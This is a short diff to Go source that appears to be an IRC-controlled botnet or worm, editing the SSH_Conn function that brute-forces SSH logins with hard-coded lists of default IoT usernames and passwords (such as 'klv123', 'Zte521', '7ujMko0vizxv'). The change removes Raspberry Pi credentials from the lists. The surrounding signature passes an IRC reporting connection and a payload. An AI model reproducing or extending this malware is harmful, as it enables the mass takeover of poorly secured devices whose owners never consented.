@@ -115,7 +115,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		Add more usernames and passwords in to The array name "userList" and "passList".
 	*/
 	userList := []string{
-		"admin", "root", "user", "guest", "support", "login", "pi",
+		"admin", "root", "user", "guest", "support", "login",
 	}
 
 	passList := []string{
@@ -124,7 +124,6 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		"juantech", "user", "admin1234", "666666", "klv123", "klv1234", "Zte521", "hi3518",
 		"jvbzd", "7ujMko0vizxv", "7ujMko0admin", "ikwb", "system", "realtek", "00000000", "smcadmin",
 		"123456789", "12345678", "111111", "123123", "1234567890", "login", "supoort", "guest",
-		"rasberrypi",
 	}
 
 	for {
